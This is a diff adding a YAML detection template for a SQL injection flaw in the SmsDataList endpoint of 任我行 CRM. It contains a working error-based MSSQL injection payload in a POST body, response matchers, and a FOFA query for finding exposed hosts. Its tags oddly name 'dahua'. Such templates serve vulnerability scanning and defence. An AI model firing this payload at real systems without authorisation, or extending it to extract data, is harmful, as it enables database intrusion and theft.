@@ -1,0 +1,30 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: /Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'%20and%201=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123123'))))%20AND%20'CvNI'='CvNI
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"message":'
+          - 4297f44b13955235245b2497399d7a93
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/SMS/SmsDataList/?pageIndex=1&pageSize=30'
+id: wecrm-smsdatalist-sqli
+info:
+  author: peiqi
+  description: |
+    任我行 CRM SmsDataList 接口存在SQL注入漏洞，攻击者通过漏洞可以执行任意数据库语句，获取敏感信息
+    FOFA: "欢迎使用任我行CRM"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 任我行 CRM SmsDataList SQL注入漏洞
+  severity: high
+  tags: dahua,sqli,argus-import
